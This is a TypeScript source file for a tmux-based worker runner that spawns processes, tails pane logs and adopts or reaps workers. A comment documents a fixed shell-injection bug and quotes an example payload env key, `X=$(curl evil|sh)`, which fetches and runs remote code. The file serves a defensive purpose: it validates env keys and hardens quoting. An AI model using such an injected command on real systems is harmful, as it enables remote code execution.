import { spawn } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import { symlink, open, readFile, stat, mkdir, rm, writeFile } from "node:fs/promises";
import { watch } from "node:fs";
import { basename, join, resolve } from "node:path";
import type { WorkerProcess, WorkerRunner, WorkerInfo, WorkerSpec } from "@ancientvoid/contracts";

export const TMUX_PREFIX = "ancientvoid-";

/**
 * BUG (found by an independent red-team review, 2026-09-18, T4.10): the
 * shell command line `spawn()` builds interpolates every `spec.env` KEY
 * unescaped and unvalidated — only VALUES were quoted. `spec.env` is
 * client-reachable (`SessionSpec.env` in `CreateSessionBody`, forwarded
 * unchanged by every adapter that spawns a worker), so an env key like
 * `` X=$(curl evil|sh) `` produced a real shell command-substitution RCE
 * when the resulting `env <keys...> <cmd>; echo ...` string reached
 * `tmux respawn-pane` (which runs it via the pane's shell) — reproduced
 * live: the exact string-building logic below, run through `sh -c`,
 * executed the injected command. POSIX only allows `[A-Za-z_][A-Za-z0-9_]*`
 * as a variable name; anything else is refused outright rather than
 * "sanitized" (a name containing `=` or `$(...)` has no safe rewritten
 * form that preserves intent — the caller's env object is simply wrong).
 */
const SAFE_ENV_KEY = /^[A-Za-z_][A-Za-z0-9_]*$/;

/** T17.5/ADR-0037: env keys the runner itself owns as pane markers. A caller
 * putting them into spec.env would fake another session's identity —
 * refused like an illegal key, same BUG-0012 reasoning (fail loud, no spawn). */
const RESERVED_ENV_KEYS = new Set(["ANCIENTVOID_SESSION_ID", "ANCIENTVOID_WORKER_ID"]);

/** T17.5: marker values are hub-internal ids (randomUUID / session ids).
 * Operationally "never user input" means: one token, nothing a tmux format
 * string, an env assignment or a shell could reinterpret. */
const SAFE_MARKER_VALUE = /^[A-Za-z0-9][A-Za-z0-9_-]{0,127}$/;

function shellQuote(value: string): string {
  // Single-quote the whole value, escaping embedded single quotes the
  // standard POSIX way ('\'') — properly escapes instead of the previous
  // `replaceAll("'", "")`, which silently deleted embedded quotes instead
  // of preserving them (found alongside the injection above; same file,
  // same line, worth fixing together rather than leaving unsound
  // value-quoting next to a freshly-fixed key-quoting bug).
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

function execTmux(args: string[], opts: { cwd?: string } = {}): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const proc = spawn("tmux", args, { cwd: opts.cwd, stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    proc.stdout.on("data", (d: Buffer) => (stdout += d.toString()));
    proc.stderr.on("data", (d: Buffer) => (stderr += d.toString()));
    proc.on("error", reject);
    proc.on("close", (code) => resolve({ code: code ?? -1, stdout, stderr }));
  });
}

/** T7.2: the FIFO a pipe-mode worker reads its stdin from. */
function stdinPath(logPath: string): string {
  return `${logPath}.in`;
}

/** Writes in order into the worker's stdin FIFO. The pane keeps a reader
 * open, so opening for write never blocks. The handle must be closed when
 * the worker ends — Node 26 treats a handle left to GC as an error. */
function pipeWriter(fifo: string): { write: (data: string) => void; close: () => void } {
  const handle = open(fifo, "w");
  let chain: Promise<unknown> = handle;
  let closed = false;
  return {
    write: (data) => {
      if (closed) return;
      chain = chain.then(() => handle).then((fh) => fh.write(data)).catch(() => undefined);
    },
    close: () => {
      if (closed) return;
      closed = true;
      chain = chain.then(() => handle).then((fh) => fh.close()).catch(() => undefined);
    },
  };
}

function offsetPath(logPath: string): string {
  return `${logPath}.offset`;
}

/** Tail a file line by line; used to stream pane output captured via pipe-pane. */
class FileTailer {
  private offset = 0;
  private watcher?: ReturnType<typeof watch>;
  private closed = false;
  private pumping = false;
  private buffer = "";
  private readonly listeners = new Set<(line: string) => void>();
  private pollTimer?: NodeJS.Timeout;

  private readonly path: string;
  private readonly startOffset: number;

  /** `startOffset` > 0 resumes an adopted worker (T5.6) where the previous
   * hub stopped delivering lines. */
  constructor(path: string, startOffset = 0) {
    this.path = path;
    this.startOffset = startOffset;
  }

  onLine(cb: (line: string) => void): void {
    this.listeners.add(cb);
  }

  async start(): Promise<void> {
    // Always read from byte 0. Seeking to EOF (the previous behaviour)
    // dropped every line a short command had already written — the env
    // pass-through test (`echo $GREETING`) finished before start() ran
    // and then waited 600 ms on an empty buffer (found while P4.5 ran
    // the existing suite; same class of race P12 T12.2 called "tmux
    // unreliability").
    this.offset = this.startOffset;
    this.watcher = watch(this.path, { persistent: false }, () => void this.pump());
    this.pollTimer = setInterval(() => void this.pump(), 250);
    this.pollTimer.unref();
    await this.pump();
  }

  private async pump(): Promise<void> {
    if (this.closed || this.pumping) return;
    this.pumping = true;
    try {
      const st = await stat(this.path);
      if (st.size > this.offset) {
        const fh = await open(this.path, "r");
        try {
          const len = st.size - this.offset;
          const buf = Buffer.alloc(len);
          await fh.read(buf, 0, len, this.offset);
          this.offset += len;
          this.buffer += buf.toString("utf8");
          const lines = this.buffer.split("\n");
          this.buffer = lines.pop() ?? "";
          for (const line of lines) {
            for (const cb of this.listeners) cb(line);
          }
          // T5.6: bytes of complete, delivered lines — where an adopting
          // hub continues after a crash.
          if (lines.length > 0) {
            await writeFile(offsetPath(this.path), String(this.offset - Buffer.byteLength(this.buffer, "utf8")));
          }
        } finally {
          await fh.close();
        }
      }
    } catch {
      // file rotated/removed — stop quietly
    } finally {
      this.pumping = false;
    }
  }

  stop(): void {
    this.closed = true;
    this.watcher?.close();
    if (this.pollTimer) clearInterval(this.pollTimer);
  }
}

/**
 * tmux-backed WorkerRunner (ADR-P0-3): workers survive daemon restarts and
 * are attachable for emergency debugging (`tmux attach -t ancientvoid-<session>`).
 * Pane output is captured via pipe-pane into a log file the WorkerProcess tails.
 */
export class TmuxRunner implements WorkerRunner {
  readonly kind = "tmux";

  private readonly logDir: string;
  /** BUG-0019: every hub shares the user's default tmux server. A worker
   * carries its owner as the session option `@ancientvoid_owner`; list() and
   * reapOrphans() only see the workers of this runner, so a second hub
   * (tests, E2E, another data dir) never kills a live worker it does not
   * own. Workers without the option are foreign too. */
  readonly owner: string;

  /** T17.6: fallback paths (no marker) are reported here — the heuristic
   * stays visible until T12.5 has proven the marker path broadly. */
  private readonly log: ((level: "info" | "warn", msg: string, fields?: Record<string, unknown>) => void) | undefined;

  constructor(
    logDir: string,
    owner?: string,
    log?: (level: "info" | "warn", msg: string, fields?: Record<string, unknown>) => void,
  ) {
    this.logDir = logDir;
    this.owner = owner ?? createHash("sha256").update(resolve(logDir)).digest("hex").slice(0, 16);
    this.log = log;
  }

  private fullName(name: string): string {
    return name.startsWith(TMUX_PREFIX) ? name : `${TMUX_PREFIX}${name}`;
  }

  async isAvailable(): Promise<boolean> {
    const res = await execTmux(["-V"]).catch(() => null);
    return res !== null && res.code === 0;
  }

  async spawn(spec: WorkerSpec): Promise<WorkerProcess> {
    // Validated FIRST, before any I/O: a rejected env key must never reach
    // tmux, and reachability shouldn't depend on tmux being installed.
    for (const key of Object.keys(spec.env ?? {})) {
      if (!SAFE_ENV_KEY.test(key)) {
        throw new Error(`TmuxRunner: invalid environment variable name "${key}" — refusing to spawn (shell-injection guard)`);
      }
    }
    // T17.5 (AC-P17-4): marker keys are the hub's — an adapter or client
    // trying to set them would fake worker identity. Same fail-loud pattern.
    for (const key of Object.keys(spec.env ?? {})) {
      if (RESERVED_ENV_KEYS.has(key)) {
        throw new Error(`TmuxRunner: env key "${key}" is reserved for hub markers — refusing to spawn (identity-injection guard)`);
      }
    }
    const sessionId = spec.sessionId ?? spec.name;
    if (!SAFE_MARKER_VALUE.test(sessionId)) {
      throw new Error(`TmuxRunner: marker value "${sessionId}" is not a hub-internal id — refusing to spawn (marker-injection guard)`);
    }
    const workerId = randomUUID();

    await mkdir(this.logDir, { recursive: true });
    const full = this.fullName(spec.name ?? "session");
    // BUG-0157: Log/Offset/FIFO je Generation (workerId) — ein Nachfolger unter
    // demselben Namen schreibt nie in die Dateien eines alten Handles, und ein
    // alter Handle liest nie den Nachfolger. `<full>.log` bleibt als
    // Latest-Symlink für Diagnosepfad und Legacy-Adoption erhalten.
    const logPath = join(this.logDir, `${full}.${workerId.slice(0, 8)}.log`);

    // Clean any stale session/log from a previous run with the same name
    // (pre-BUG-0157 generations kept their log under the plain name).
    await execTmux(["kill-session", "-t", full]).catch(() => undefined);
    const legacyLog = join(this.logDir, `${full}.log`);
    await rm(legacyLog, { force: true });
    await rm(offsetPath(legacyLog), { force: true });
    await rm(stdinPath(legacyLog), { force: true });
    await rm(offsetPath(logPath), { force: true });
    await rm(stdinPath(logPath), { force: true });

    const cmdLine = spec.cmd
      .map((a) => (/^[\w./=@%^+:-]+$/.test(a) ? a : shellQuote(a)))
      .join(" ");
    const envPrefix = Object.entries(spec.env ?? {})
      .map(([k, v]) => `${k}=${shellQuote(v)}`)
      .join(" ");
    // Die Pane-Kommandozeile laeuft durch tmux' default-shell — das ist die
    // Login-Shell des Nutzers (z. B. fish, wo `$?` und POSIX-Quote-Nesting
    // ungueltig sind: das Pane starb beim Spawn). Der Wrapper steckt deshalb in
    // einer Datei, und der Shell wird nur `sh <datei>` uebergeben — das versteht
    // jede Shell gleich.
    let wrapperBody: string;
    if (spec.stdin === "pipe") {
      // T7.2: stdin from a FIFO the pane itself holds open read-write (fd 3):
      // writers (this hub, the next one after a restart) come and go without
      // the worker ever seeing EOF, and nothing is echoed or cut at the
      // terminal's 4 KB line limit. POSIX sh, whatever the user's shell is.
      const fifo = stdinPath(logPath);
      const mk = await new Promise<number>((done) => spawn("mkfifo", ["-m", "600", fifo]).on("exit", (code) => done(code ?? 1)));
      if (mk !== 0) throw new Error(`tmux spawn failed: mkfifo ${fifo}`);
      wrapperBody = `exec 3<>${shellQuote(fifo)}; env ${envPrefix} ${cmdLine} <&3; echo "__ANCIENTVOID_EXIT__$?"`;
    } else {
      wrapperBody = `env ${envPrefix} ${cmdLine}; echo "__ANCIENTVOID_EXIT__$?"`;
    }
    const wrapperPath = `${logPath}.sh`;
    await writeFile(wrapperPath, `#!/bin/sh
${wrapperBody}
`, { mode: 0o700 });
    const shellCmd = `sh ${shellQuote(wrapperPath)}`;

    // 1. Create the session with a placeholder — so options can be applied
    //    BEFORE the real command runs (no remain-on-exit race for short cmds).
    const res = await execTmux([
      "new-session",
      "-d",
      "-s",
      full,
      "-c",
      spec.cwd,
      "-x",
      String(spec.cols ?? 220),
      "-y",
      String(spec.rows ?? 50),
      "sleep 300",
    ]);
    if (res.code !== 0) {
      throw new Error(`tmux spawn failed: ${res.stderr.trim()}`);
    }
    try {
      await execTmux(["set-option", "-t", full, "@ancientvoid_owner", this.owner]);
      // BUG-0034: where this worker's logs live — a prune recognizes an
      // orphan in the default server by its log dir being gone.
      await execTmux(["set-option", "-t", full, "@ancientvoid_logdir", this.logDir]);
      // T17.5/ADR-0037: stable identity for adoption (T17.6) and prune.
      // Session OPTION (readable via list-sessions -F — what list(), adopt()
      // and orphans read) AND pane ENV (inherited by the respawned process,
      // readable via /proc/<pid>/environ and by the worker itself).
      await execTmux(["set-option", "-t", full, "@ancientvoid_session", sessionId]);
      await execTmux(["set-option", "-t", full, "@ancientvoid_worker", workerId]);
      // BUG-0157: der Generations-Logpfad dieser Spawn-Generation — Adoption
      // und Diagnose finden ihn hier, nicht über den wiederverwendbaren Namen.
      await execTmux(["set-option", "-t", full, "@ancientvoid_log", logPath]);
      await execTmux(["set-environment", "-t", full, "ANCIENTVOID_SESSION_ID", sessionId]);
      await execTmux(["set-environment", "-t", full, "ANCIENTVOID_WORKER_ID", workerId]);
      // 2. Keep the pane after exit so pipe-pane can flush the tail reliably.
      await execTmux(["set-option", "-t", full, "remain-on-exit", "on"]);
      // 3. Capture pane output (stdout+stderr interleaved) into the log file.
      await execTmux(["pipe-pane", "-t", full, "-o", `cat >> ${logPath}`]);
      // 4. Swap the placeholder for the real command.
      await execTmux(["respawn-pane", "-k", "-t", full, "-c", spec.cwd, shellCmd]);
      // Latest-Symlink für den bisherigen Diagnosepfad (`<name>.log`).
      await rm(legacyLog, { force: true });
      await symlink(basename(logPath), legacyLog).catch(() => undefined);
    } catch (err) {
      await execTmux(["kill-session", "-t", full]).catch(() => undefined);
      throw err;
    }

    return this.track(full, logPath, 0, spec.stdin === "pipe");
  }

  /**
   * T5.6 / ADR-0014: take over a worker this runner owns that survived a hub
   * restart. Output continues after the last line the previous hub
   * delivered. Null when there is no such worker.
   */
  async adopt(sessionId: string): Promise<WorkerProcess | null> {
    // T17.6/ADR-0037: the @ancientvoid_session marker is the primary identity —
    // the tmux session name is only the fallback (pre-T17.5 worker) and
    // that fallback is logged, never silent.
    const workers = await this.list();
    const marked = workers.find((w) => w.sessionId === sessionId) ?? null;
    const target = marked ?? workers.find((w) => w.fullName === this.fullName(sessionId)) ?? null;
    if (!target) return null;
    if (!marked) {
      this.log?.("warn", "adopt without @ancientvoid_session marker — fell back to name heuristic", { sessionId, fullName: target.fullName });
    }
    const full = target.fullName;
    // BUG-0157: der Marker nennt den Generations-Logpfad (pipe-pane hält
    // den Spawn-Zeit-Pfad). Fallback ohne Marker: der alte Namenspfad.
    let logPath = target.log ?? join(this.logDir, `${full}.log`);
    // A renamed session keeps writing its ORIGINAL log (pipe-pane holds the
    // spawn-time path). When the renamed path is missing, the marker lets us
    // look under the original name — without this, adopting a renamed
    // worker would crash on a log that never existed.
    if (
      !(await stat(logPath).then(
        () => true,
        () => false,
      )) &&
      target.fullName !== this.fullName(sessionId)
    ) {
      const original = join(this.logDir, `${this.fullName(sessionId)}.log`);
      if (
        await stat(original).then(
          () => true,
          () => false,
        )
      ) {
        logPath = original;
        this.log?.("info", "adopted a renamed worker — following its original log", { sessionId, fullName: target.fullName });
      }
    }
    const saved = Number(await readFile(offsetPath(logPath), "utf8").catch(() => "0"));
    const piped = await stat(stdinPath(logPath)).then(
      (s) => s.isFIFO(),
      () => false,
    );
    return this.track(full, logPath, Number.isFinite(saved) && saved > 0 ? saved : 0, piped);
  }

  private async track(full: string, logPath: string, startOffset: number, piped = false): Promise<WorkerProcess> {
    const pipe = piped ? pipeWriter(stdinPath(logPath)) : null;
    // BUG-0157: die unveränderliche Pane-ID dieser Generation ist das Ziel
    // aller Steuerung (kill/write/Status). Der Sessionname wird an den
    // Nachfolger vererbt — ein alter Handle darf ihn nie wieder ansteuern.
    const paneId = await this.paneId(full);
    const target = paneId !== undefined ? `%${paneId}` : full;
    const pid = await this.panePid(target);
    // BUG-0157-Nachtrag (tmux 3.5a): Auf einem leeren Server recycled tmux
    // Pane-IDs — der Nachfolger bekam dieselbe %ID zurück. Identität einer
    // Pane ist erst ID + PID zusammen (PID lebt nur solange die Pane).
    const paneIsMine = () => this.paneIsMine(target, paneId, pid);
    const tailer = new FileTailer(logPath, startOffset);
    let exited = false;
    let exitCode: number | null = null;
    const exitCbs = new Set<(code: number | null) => void>();
    const exitPromise = new Promise<{ code: number | null }>((resolve) => {
      exitCbs.add((code) => resolve({ code }));
    });
    const stdoutCbs = new Set<(chunk: string) => void>();
    const stdoutReplay: string[] = [];

    tailer.onLine((line) => {
      if (line.includes("__ANCIENTVOID_EXIT__")) return;
      const chunk = `${line}\n`;
      if (stdoutCbs.size === 0) stdoutReplay.push(chunk);
      else for (const cb of stdoutCbs) cb(chunk);
    });
    await tailer.start();

    const checkExit = setInterval(async () => {
      if (exited) return;
      const dead = await this.paneDead(target);
      if (!dead) return;
      exited = true;
      clearInterval(checkExit);
      // pipe-pane flushes asynchronously — retry briefly until the marker lands.
      for (let i = 0; i < 8; i++) {
        try {
          const content = await readFile(logPath, "utf8");
          const m = content.match(/__ANCIENTVOID_EXIT__(\d+)/);
          if (m) {
            exitCode = Number(m[1]);
            break;
          }
        } catch {
          // log not readable (yet)
        }
        await new Promise((r) => setTimeout(r, 150));
      }
      tailer.stop();
      pipe?.close();
      for (const cb of exitCbs) cb(exitCode);
      // Clean up the remained pane — the log file keeps the evidence.
      // BUG-0157: nur, wenn die Session noch UNSERE Pane enthält — einer
      // unter demselben Namen läuft eine Nachfolger-Generation: Der Name gehört
      // ihr jetzt, sie bleibt unbehelligt.
      await this.killSessionIfOurs(full, paneId, pid);
    }, 200);

    return {
      ...(pid !== undefined ? { pid } : {}),
      attachCmd: `tmux attach -t ${full}`,
      stdinMode: piped ? "pipe" : "tty",
      onStdout: (cb) => {
        stdoutCbs.add(cb);
        for (const chunk of stdoutReplay) cb(chunk);
        stdoutReplay.length = 0;
      },
      onStderr: (_cb) => {
        // stdout/stderr are interleaved in the pane capture
      },
      onExit: (cb) => exitCbs.add(cb),
      write: pipe ? pipe.write : (data) => void execTmux(["send-keys", "-t", target, "-l", data]),
      kill: async (signal) => {
        if (signal === "SIGKILL") await this.killSessionIfOurs(full, paneId, pid);
        else if (await paneIsMine()) {
          await execTmux(["send-key", "-t", target, "C-c"]).catch(() => undefined);
          await new Promise((r) => setTimeout(r, 100));
        }
      },
      exited: () => exitPromise,
    };
  }

  private async paneId(full: string): Promise<string | undefined> {
    const res = await execTmux(["display-message", "-p", "-t", full, "#{pane_id}"]).catch(() => null);
    const id = res && res.code === 0 ? res.stdout.trim().replace(/^%/, "") : "";
    return id ? id : undefined;
  }

  private async panePid(target: string): Promise<number | undefined> {
    const res = await execTmux(["display-message", "-p", "-t", target, "#{pane_pid}"]).catch(() => null);
    const pid = res && res.code === 0 ? Number(res.stdout.trim()) : NaN;
    return Number.isFinite(pid) && pid > 0 ? pid : undefined;
  }

  private async paneDead(target: string): Promise<boolean> {
    // BUG-0157: exakte Pane-Adresse ("%<id>") statt Sessionname — der Name
    // kann schon einem Nachfolger gehören, die Pane-ID nie. Ein nicht mehr
    // existierendes Ziel (tmux-Fehler/leere Antwort) heißt: unsere Pane ist
    // weg, also tot — auch wenn unter dem alten Namen längst ein Nachfolger
    // läuft (BUG-0025s Präfix-Problem betrifft keine Pane-IDs).
    const res = await execTmux(["display-message", "-p", "-t", target, "#{pane_dead}"]).catch(
      () => null,
    );
    if (!res) return true; // tmux itself failed to run
    if (res.code !== 0) return true;
    const state = res.stdout.trim();
    return state === "" || state === "1";
  }

  /** BUG-0157 (+ tmux 3.5a): Eine Pane gilt als unsere, wenn ID UND PID
   * zusammenpassen — tmux recycled Pane-IDs, sobald der Server leer war.
   * Eine tote Pane (remain-on-exit-Husk) liefert keine PID mehr, ist aber
   * nachweislich tot: eine unter derselben ID recyclede Nachfolger-Pane
   * wäre lebendig. Ohne Pane-ID (Legacy) bleibt der Namenspfad. */
  private async paneIsMine(target: string, paneId: string | undefined, pid: number | undefined): Promise<boolean> {
    if (paneId === undefined) return true;
    const res = await execTmux(["display-message", "-p", "-t", target, "#{pane_pid}|#{pane_dead}"]).catch(() => null);
    if (!res || res.code !== 0 || !res.stdout.trim()) return false; // Ziel existiert nicht (mehr)
    const [panePid, dead] = res.stdout.trim().split("|");
    if (dead === "1") return true; // unsere tote Husk — PID-Bestätigung unmöglich und unnötig
    return pid === undefined || panePid === String(pid);
  }

  /** BUG-0157: kill-session nur, wenn die Session noch UNSERE Pane enthält —
   * einer Nachfolger-Generation unter demselben Namen gehört der Name dann,
   * sie bleibt unbehelligt. */
  private async killSessionIfOurs(full: string, paneId: string | undefined, pid?: number): Promise<void> {
    if (paneId === undefined) {
      await execTmux(["kill-session", "-t", full]).catch(() => undefined);
      return;
    }
    if (!(await this.paneIsMine(`%${paneId}`, paneId, pid))) return; // fremd oder weg — nichts anfassen
    await execTmux(["kill-session", "-t", full]).catch(() => undefined);
  }

  async list(): Promise<WorkerInfo[]> {
    // tmux 3.5 ersetzt Steuerzeichen in -F (auch Tab) durch "_", dann bleibt eine Spalte übrig.
    const res = await execTmux([
      "list-sessions",
      "-F",
      "#{session_name}|#{pane_pid}|#{session_created}|#{@ancientvoid_owner}|#{@ancientvoid_session}|#{@ancientvoid_worker}|#{@ancientvoid_log}",
    ]).catch(() => null);
    if (!res || res.code !== 0) return [];
    return res.stdout
      .trim()
      .split("\n")
      .map((l) => l.split("|"))
      .filter(([name, , , owner]) => name?.startsWith(TMUX_PREFIX) && owner === this.owner)
      .map(([name, pid, created, , sessionId, workerId, log]) => {
        const pidNum = pid ? Number(pid) : NaN;
        const createdNum = created ? Number(created) * 1000 : NaN;
        return {
          name: name!.slice(TMUX_PREFIX.length),
          fullName: name!,
          // T17.5: empty for workers from a pre-marker hub — callers treat
          // absence as "use the fallback and say so".
          ...(sessionId ? { sessionId } : {}),
          ...(workerId ? { workerId } : {}),
          // BUG-0157: Generations-Logpfad dieser Spawn-Generation.
          ...(log ? { log } : {}),
          ...(Number.isFinite(pidNum) ? { pid: pidNum } : {}),
          ...(Number.isFinite(createdNum) ? { createdAt: createdNum } : {}),
        };
      });
  }

  async killByName(fullName: string, signal?: "SIGTERM" | "SIGKILL"): Promise<void> {
    const full = this.fullName(fullName);
    if (signal !== "SIGKILL") {
      await execTmux(["send-key", "-t", full, "C-c"]).catch(() => undefined);
      await new Promise((r) => setTimeout(r, 100));
    }
    await execTmux(["kill-session", "-t", full]).catch(() => undefined);
  }

  async reapOrphans(keep: readonly string[]): Promise<string[]> {
    const keepSet = new Set(keep.map((k) => this.fullName(k)));
    // T17.6: marker first — a renamed session must not be reaped just
    // because its name no longer matches a recovered session.
    const keepIds = new Set(keep);
    const workers = await this.list();
    const reaped: string[] = [];
    for (const w of workers) {
      if (keepSet.has(w.fullName) || (w.sessionId !== undefined && keepIds.has(w.sessionId))) continue;
      await this.killByName(w.fullName, "SIGKILL").catch(() => undefined);
      reaped.push(w.fullName);
    }
    return reaped;
  }
}
